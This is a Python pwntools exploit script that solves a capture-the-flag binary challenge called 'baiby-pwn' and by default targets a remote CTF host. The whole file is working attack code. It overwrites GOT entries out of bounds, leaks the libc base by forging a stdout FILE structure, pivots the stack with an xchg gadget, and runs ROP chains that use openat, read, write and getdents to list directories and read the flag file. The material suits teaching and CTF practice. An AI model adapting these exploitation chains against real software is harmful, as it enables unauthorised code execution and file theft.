#!/usr/bin/env python3
"""baiby-pwn: GOT OOB write → FILE leak → xchg eax,esp pivot → openat/getdents ORW."""

from __future__ import annotations

import argparse
import os
import re
import sys

from pwn import context, ELF, process, remote, p64, u64, flat, log

context.arch = "amd64"

HERE = os.path.abspath(os.path.dirname(__file__))
BIN_PATH = os.path.join(HERE, "baiby-pwn")
PATCHED = os.path.join(HERE, "baiby-patched")
LIBC_PATH = os.path.join(HERE, "libc.so.6")

GADGET = 0x4011E2  # mov rsi, rax; mov edi, 0; call read
SETBUF_STDOUT = 0x401231
SETBUF_STUB = 0x401040
LOOP = 0x401259
MAIN = 0x401211
ARR = 0x404080
GOT_READ = 0x404018
GOT_MEMSET = 0x404010
STDOUT_COPY = 0x404040


def field(n: int) -> bytes:
    s = str(n).encode()
    if len(s) > 7:
        raise ValueError(n)
    return s.ljust(7, b"\x00")


class Solver:
    def __init__(self, io, libc: ELF):
        self.io = io
        self.libc = libc

    def cmd_write(self, idx: int, val: int) -> None:
        self.io.send(field(1) + field(idx) + field(val))

    def leak(self) -> int:
        self.cmd_write(-16, LOOP)
        self.cmd_write(-15, GADGET)
        self.cmd_write(-14, SETBUF_STDOUT)
        fake = p64(0xFBAD1800) + p64(0) * 3 + p64(GOT_READ) + p64(GOT_READ + 8) * 2
        self.io.send(field(2) + fake.ljust(0x40, b"\x00"))
        self.cmd_write(-15, SETBUF_STUB)
        self.io.send(field(2))
        leak = u64(self.io.recv(8))
        base = leak - self.libc.sym["read"]
        if base & 0xFFF:
            raise RuntimeError(f"unaligned leak {hex(leak)}")
        self.libc.address = base
        return base

    def raw_into(self, dest: int, data: bytes) -> None:
        data = data.ljust(0x40, b"\x00")
        if len(data) != 0x40:
            raise ValueError("raw payload must be 64 bytes")
        self.cmd_write(-8, dest)
        self.cmd_write(-15, GADGET)
        self.cmd_write(-14, SETBUF_STDOUT)
        self.io.send(field(2) + data)

    def got_install(self, memset_fn: int) -> None:
        """Write memset/read/atol GOT and restore stdout FILE* copy."""
        blob = flat(
            memset_fn,
            self.libc.sym["read"],
            self.libc.sym["atol"],
            0,
            0,
            0,
            self.libc.sym["_IO_2_1_stdout_"],
            0,
        )
        self.raw_into(GOT_MEMSET, blob)

    def plant_rop(self, payload: bytes) -> None:
        # Binary-safe: gets() would stop on 0x0a inside libc addresses.
        if len(payload) > 0xF00:
            raise ValueError("payload too large for bss page")
        padded = payload.ljust((len(payload) + 0x3F) & ~0x3F, b"\x00")
        for off in range(0, len(padded), 0x40):
            self.raw_into(ARR + off, padded[off : off + 0x40])

    def pivot(self) -> None:
        xchg = self.libc.address + 0x47CDF  # xchg eax, esp; ret
        self.got_install(xchg)
        self.io.send(field(2))

    def _g(self):
        a = self.libc.address
        return a + 0x10F78B, a + 0x110A7D, a + 0xDD237, a + 0x98FB6, self.libc.bss() + 0x800

    def build_orw(self, path: bytes) -> bytes:
        pop_rdi, pop_rsi, pop_rax, syscall, buf = self._g()
        path = path.rstrip(b"\x00") + b"\x00"
        # SYS_open is often seccomp-blocked; openat(AT_FDCWD, path, rdx=0x40=O_CREAT)
        # still opens an existing file O_RDONLY. rdx leftover from cmd2 is 0x40.
        nq = 21
        path_addr = ARR + nq * 8
        return (
            flat(
                pop_rdi, 0xFFFFFFFFFFFFFF9C, pop_rsi, path_addr, pop_rax, 257, syscall,
                pop_rdi, 3, pop_rsi, buf, pop_rax, 0, syscall,
                pop_rdi, 1, pop_rsi, buf, pop_rax, 1, syscall,
            )
            + path
        )

    def build_listdir(self) -> bytes:
        pop_rdi, pop_rsi, pop_rax, syscall, buf = self._g()
        pop_rbp = self.libc.address + 0x28A91
        pop_rdx_leave = self.libc.address + 0x981AD
        chunks = 4
        # libc.open("/", 0) zeros rdx; restore rdx=0x40 via pop rdx; leave; ret
        head = [
            pop_rdi, 0, pop_rsi, 0, self.libc.sym["open"],
            pop_rbp, 0, pop_rdx_leave, 0x40,
        ]
        # FRAME is dummy_rbp immediately after this head
        frame_off = len(head) * 8
        head[6] = ARR + frame_off  # pop rbp value
        parts = list(head) + [0, pop_rdi, 3]
        for i in range(chunks):
            if i:
                parts += [pop_rdi, 3]
            parts += [pop_rsi, buf + i * 0x40, pop_rax, 217, syscall]
        for i in range(chunks):
            parts += [pop_rdi, 1, pop_rsi, buf + i * 0x40, pop_rax, 1, syscall]
        chain = bytearray(flat(*parts))
        chain[8:16] = p64(ARR + len(chain))  # path ptr for open
        return bytes(chain) + b"/\x00"


def parse_flag(data: bytes) -> str | None:
    m = re.search(rb"BHFlagY\{[^}]+\}", data)
    return m.group(0).decode() if m else None


def parse_flag_name(data: bytes) -> str | None:
    m = re.search(rb"flag-[0-9a-f]{32}\.txt", data)
    return m.group(0).decode() if m else None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--host", default="tcp.flagyard.com")
    ap.add_argument("--port", type=int, default=17416)
    ap.add_argument("--path", default="", help="exact file to ORW; empty = list / then open hashed flag")
    ap.add_argument("--leak-only", action="store_true")
    args = ap.parse_args()

    context.arch = "amd64"
    context.log_level = "info"
    libc = ELF(LIBC_PATH, checksec=False)

    if args.local:
        exe = PATCHED if os.path.exists(PATCHED) else BIN_PATH
        io = process(exe)
        path = args.path.encode() or b"/tmp/baiby_flag.txt"
    else:
        io = remote(args.host, args.port)
        path = args.path.encode()

    s = Solver(io, libc)
    try:
        base = s.leak()
        log.success(f"libc {hex(base)}")
        if args.leak_only:
            io.close()
            print(f"LIBC {hex(base)}")
            return 0

        def recv_all():
            try:
                return io.recvall(timeout=3)
            except EOFError:
                return io.buffer.data if io.buffer.data else b""

        if path:
            payload = s.build_orw(path)
            s.plant_rop(payload)
            s.pivot()
            data = recv_all()
            print(data)
            flag = parse_flag(data)
            if flag:
                print(flag)
                return 0
            io.close()
            return 1

        # remote: dump / then open hashed flag on a fresh connection
        payload = s.build_listdir()
        s.plant_rop(payload)
        s.pivot()
        listing = recv_all()
        print(listing)
        name = parse_flag_name(listing)
        io.close()
        if not name:
            log.failure("no hashed flag name in listing")
            return 1
        log.success(f"flag file {name}")
        io = remote(args.host, args.port)
        s = Solver(io, ELF(LIBC_PATH, checksec=False))
        s.leak()
        s.plant_rop(s.build_orw(b"/" + name.encode()))
        s.pivot()
        try:
            data = io.recvall(timeout=3)
        except EOFError:
            data = io.buffer.data if io.buffer.data else b""
        print(data)
        flag = parse_flag(data)
        if flag:
            print(flag)
            return 0
        return 1
    finally:
        try:
            io.close()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
